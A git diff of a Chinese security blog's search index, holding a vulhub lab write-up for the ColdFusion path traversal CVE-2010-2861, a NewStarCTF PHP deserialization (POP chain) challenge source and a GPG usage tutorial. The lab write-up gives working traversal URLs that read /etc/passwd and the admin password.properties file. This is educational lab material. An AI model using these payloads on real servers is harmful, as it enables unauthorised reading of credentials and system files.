@@ -1,6 +1,47 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
+    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
+<ol>
+<li>复现环境中的任意文件读取漏洞，截图证明</li>
+<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
+</ol>
+<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>
+
+<p>启动后，访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
+<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
+<img src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
+<p>即可读取文件<code>/etc/passwd</code>：</p>
+<p>我这里是：</p>
+<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
+<img src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
+
+<p>读取后台管理员密码</p>
+<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
+<img src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
+
+<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en<br></code></pre></td></tr></table></figure>
+
+<p>浏览器输入payload得到license.txt</p>
+<img src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUUCTF-NewStar2023-Week1-Begin-of-HTTP</title>
     <url>/2023/10/26/BUUCTF-NewStar2023-Week1-Begin-of-HTTP/</url>
     <content><![CDATA[<p>昨天做了一道非常简单的新生赛CTF题目<br>        <img src="https://s2.loli.net/2023/10/29/jAtu2VPR4wWHeCf.png" style="zoom:67%;" />  </p>
@@ -76,44 +117,25 @@
       </tags>
   </entry>
   <entry>
-    <title>Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</title>
-    <url>/2023/11/11/Adobe-ColdFusion-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2010-2861%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p><strong>漏洞环境：Adobe ColdFusion 文件读取漏洞（CVE-2010-2861）</strong></p>
-<ol>
-<li>复现环境中的任意文件读取漏洞，截图证明</li>
-<li>尝试利用漏洞读取目标系统中的”&#x2F;opt&#x2F;coldfusion8&#x2F;license.txt”文件，提供截图</li>
-</ol>
-<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>执行如下命令启动Adobe CouldFusion 8.0.1版本服务器：</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">docker-compose up -d<br></code></pre></td></tr></table></figure>
+    <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
+    <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
+    <content><![CDATA[<img src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
 
-<p>启动后，访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm</code></p>
-<p>可以看到初始化页面，输入密码<code>admin</code>，最后点击ok，开始初始化整个环境。</p>
-<img src="https://images.gaifagafin.top/202311112129162.png" style="zoom:67%;" />
+<p>进入题目</p>
+<p><img src="D:/Typora/md_images/image-20231104135906002-1699077564034-1.png"></p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br><br>    &#125;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br><br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);   <br><br>  &#125;<br><br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br></code></pre></td></tr></table></figure>
 
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用另外一个浏览器直接访问</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</code></p>
-<p>即可读取文件<code>/etc/passwd</code>：</p>
-<p>我这里是：</p>
-<p><a href="http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en</a></p>
-<img src="https://images.gaifagafin.top/202311112129495.png" style="zoom:67%;" />
-
-<p>读取后台管理员密码</p>
-<p><code>http://your-ip:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en</code></p>
-<img src="https://images.gaifagafin.top/202311112129747.png" style="zoom:67%;" />
-
-<h2 id="读取license-txt文件"><a href="#读取license-txt文件" class="headerlink" title="读取license.txt文件"></a>读取license.txt文件</h2><p>根据上面的漏洞复现，构造出payload：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http">http://192.168.52.130:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../license.txt%00en<br></code></pre></td></tr></table></figure>
-
-<p>浏览器输入payload得到license.txt</p>
-<img src="https://images.gaifagafin.top/202311112129711.png" style="zoom:67%;" />
+<p>下面是POP的一些简介</p>
+<p><img src="D:/Typora/md_images/2293037-20210413224624099-855145573-1699068024385-3.png"></p>
 ]]></content>
       <categories>
-        <category>vulhub</category>
+        <category>CTF</category>
+        <category>CTF_Writeup</category>
       </categories>
       <tags>
-        <tag>vulhub</tag>
-        <tag>漏洞</tag>
+        <tag>CTF</tag>
+        <tag>POP链</tag>
       </tags>
   </entry>
   <entry>
@@ -166,25 +188,84 @@
       </tags>
   </entry>
   <entry>
-    <title>BUUCTF-NewStar2023-Week3-POP Gadget</title>
-    <url>/2023/11/04/BUUCTF-NewStar2023-Week3-POP_Gadget/</url>
-    <content><![CDATA[<img src="D:/Typora/md_images/image-20231020205454603-1699068024385-1.png" style="zoom:67%;" />
+    <title>Linux_GPG加解密文件</title>
+    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
+<p>我所使用的是kali_Linux，选择的是</p>
+<img src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
 
-<p>进入题目</p>
-<p><img src="D:/Typora/md_images/image-20231104135906002-1699077564034-1.png"></p>
-<p>代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Begin</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="hljs-variable">$this</span>-&gt;name))&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hello&quot;</span>;<br><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;<br><br>    &#125;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Then</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Good Job!&quot;</span>;<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Handle</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$vars</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">end</span>();<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Super</span></span>&#123;<br><br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$obj</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">getStr</span>();<br><br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;==GAME OVER==&quot;</span>);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CTF</span></span>&#123;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$handle</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">end</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;handle-&gt;log);<br><br>  &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WhiteGod</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function"></span><br><span class="hljs-function">  </span>&#123;<br><br>    (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);   <br><br>  &#125;<br><br>&#125;<br><br>@<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]); <br></code></pre></td></tr></table></figure>
+<p>请自行选择适合的版本下载，解压即可使用</p>
+<p>也可以输入命令安装</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install gnupg<br></code></pre></td></tr></table></figure>
 
-<p>下面是POP的一些简介</p>
-<p><img src="D:/Typora/md_images/2293037-20210413224624099-855145573-1699068024385-3.png"></p>
+<hr>
+<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
+<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
+<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
+<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
+<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
+<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
+<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
+<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
+<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
+<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --full-generate-key<br></code></pre></td></tr></table></figure>
+
+<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
+<img src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
+
+<p>输入O确定时，会让你输入密码，这个是可选项</p>
+<img src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
+
+<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
+<img src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
+
+<p>然后就会生成密钥对</p>
+<img src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
+
+<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --list-secret-keys<br></code></pre></td></tr></table></figure>
+
+<img src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
+
+<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
+<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
+<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --import receiver.key<br></code></pre></td></tr></table></figure>
+
+<img src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
+
+<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
+<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -e -r &quot;Receiver Name&quot; test.txt<br></code></pre></td></tr></table></figure>
+
+<img src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
+
+<p>得到<code>.gpg</code>后缀的加密文件</p>
+<img src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
+
+<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -d &lt;filename&gt;<br></code></pre></td></tr></table></figure>
+
+<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
+<img src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
+
+<hr>
+<p>参考链接:</p>
+<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
+<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
 ]]></content>
       <categories>
-        <category>CTF</category>
-        <category>CTF_Writeup</category>
+        <category>Linux</category>
       </categories>
       <tags>
-        <tag>CTF</tag>
-        <tag>POP链</tag>
+        <tag>GPG</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -285,87 +366,6 @@
       <tags>
         <tag>Http</tag>
         <tag>状态码</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux_GPG加解密文件</title>
-    <url>/2023/11/10/Linux%E4%BD%BF%E7%94%A8GPG%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<h2 id="下载GPG"><a href="#下载GPG" class="headerlink" title="下载GPG"></a>下载GPG</h2><p>GPG官方下载地址: <a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></p>
-<p>我所使用的是kali_Linux，选择的是</p>
-<img src="https://images.gaifagafin.top/202311101728889.png" style="zoom: 67%;" />
-
-<p>请自行选择适合的版本下载，解压即可使用</p>
-<p>也可以输入命令安装</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install gnupg<br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>要使用 GPG，你首先需要有一个 GPG 密钥。</p>
-<p>GPG 密钥是你在后面的教程中用来加密（或解密）文件的东西。它也是用来识别你的身份的，你的名字和电子邮件也会与密钥绑定。</p>
-<p>GPG 密钥的工作原理是使用两个文件，一个私钥和一个公钥。这两个密钥是相互联系的，并且 GPG 的所有功能都需要使用它们，特别是对文件加密和解密。</p>
-<p>当你用 GPG 加密一个文件时，它使用的是私钥。然后，这个新的加密文件<strong>只能</strong>用配对的公钥进行解密。</p>
-<p>私钥，顾名思义，是以私下的、不给任何人看的方式来存储的密钥。</p>
-<p>另一方面，公钥是用来给其他人的，或者你希望能够解密你的文件的任何人。</p>
-<p>这就是 GPG 的加密方法的主要作用。它允许你对文件进行本地加密，然后允许其他人确保他们收到的文件实际上是由你发送的。因为他们能够解密文件的唯一方法是使用你的公钥，而这只有在文件首先使用你的私钥加密的情况下才有效。</p>
-<p><strong>反之</strong>，其他人可以用你的公钥对文件进行加密，而唯一能够解密的方法是用你的私钥。因此，允许其他人公开发布文件，而不用担心除了你以外的人能够阅读它们。（LCTT 译注：另外一个常见的用例是你用你的私钥对公开发布的文件进行签名，别人使用你的公钥通过验证你的签名而确信文件是你发布的、并没有被篡改。但本文没有涉及这个用例。）</p>
-<p>换句话说，如果一个文件是用私钥加密的，它只能用相应的公钥解密。而如果一个文件是用公钥加密的，它只能用相应的私钥解密。</p>
-<h2 id="生成GPG密钥"><a href="#生成GPG密钥" class="headerlink" title="生成GPG密钥"></a>生成GPG密钥</h2><p>运行下面指令</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --full-generate-key<br></code></pre></td></tr></table></figure>
-
-<p>根据你的选择填写密钥类型，密钥长度，有效期限，姓名和邮箱</p>
-<img src="https://images.gaifagafin.top/202311101728808.png" style="zoom: 67%;" />
-
-<p>输入O确定时，会让你输入密码，这个是可选项</p>
-<img src="https://images.gaifagafin.top/202311101728440.png" style="zoom: 67%;" />
-
-<p>如果不想填就直接点确定，选择”是的，保护不是必须的”</p>
-<img src="https://images.gaifagafin.top/202311101728040.png" style="zoom: 67%;" />
-
-<p>然后就会生成密钥对</p>
-<img src="https://images.gaifagafin.top/202311101728869.png" style="zoom:67%;" />
-
-<p>这里我们看不到私钥，可以终端输入下面指令查看</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --list-secret-keys<br></code></pre></td></tr></table></figure>
-
-<img src="https://images.gaifagafin.top/202311101728476.png" style="zoom: 67%;" />
-
-<h2 id="GPG加密文件"><a href="#GPG加密文件" class="headerlink" title="GPG加密文件"></a>GPG加密文件</h2><p>首先创建要加密的文件(类型不限)test.txt</p>
-<p>要发送加密文件给别人，<strong>你需要有接收者的公钥</strong>，用接收者的公钥加密文件，这样<strong>只有接收者才能解密文件</strong>。具体怎么获得密钥由你自己决定。 你可以让他们直接把公钥发送给你， 也可以通过密钥服务器来获取。</p>
-<p>收到对方公钥文件后，导入公钥到 GPG 中。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg --import receiver.key<br></code></pre></td></tr></table></figure>
-
-<img src="https://images.gaifagafin.top/202311101728778.png" style="zoom: 67%;" />
-
-<p>这些公钥与你自己创建的密钥一样，自带了名称和电子邮件地址的信息。 </p>
-<p>现在可以开始加密要发送的文件了。GPG 需要知道这个文件的接收者和发送者。输入下面指令, 这里<code>-e</code>标志告诉 GPG 你想要加密文件，<code>-r</code>标志指定接收者。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -e -r &quot;Receiver Name&quot; test.txt<br></code></pre></td></tr></table></figure>
-
-<img src="https://images.gaifagafin.top/202311101728527.png" style="zoom: 67%;" />
-
-<p>得到<code>.gpg</code>后缀的加密文件</p>
-<img src="https://images.gaifagafin.top/202311101728516.png" style="zoom: 67%;" />
-
-<p>如果你有多个密钥，可以用下面指令加密，<code>-u</code>参数指定发送者</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -e -u &quot;Your Name&quot; -r &quot;Receiver Name&quot; &lt;filename&gt;<br></code></pre></td></tr></table></figure>
-
-
-
-<h2 id="GPG解密文件"><a href="#GPG解密文件" class="headerlink" title="GPG解密文件"></a>GPG解密文件</h2><p>收到对方用我们自己的公钥加密的.gpg文件后，使用下面命令解密</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gpg -d &lt;filename&gt;<br></code></pre></td></tr></table></figure>
-
-<p>例如我要解密用我的公钥加密的.gpg文件 1.txt.gpg 直接终端输入<code>gpg -d 1.txt.gpg </code></p>
-<img src="https://images.gaifagafin.top/202311101728700.png" style="zoom: 67%;" />
-
-<hr>
-<p>参考链接:</p>
-<p><a href="https://www.linuxprobe.com/gpg-encrypt-decrypt.html">https://www.linuxprobe.com/gpg-encrypt-decrypt.html</a></p>
-<p><a href="https://blog.csdn.net/qq_33919450/article/details/115706604">https://blog.csdn.net/qq_33919450/article/details/115706604</a></p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>GPG</tag>
-        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -922,70 +922,45 @@
       </tags>
   </entry>
   <entry>
-    <title>ecShop漏洞复现</title>
-    <url>/2023/11/08/ecShop%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="ecShop漏洞复现"><a href="#ecShop漏洞复现" class="headerlink" title="ecShop漏洞复现"></a>ecShop漏洞复现</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
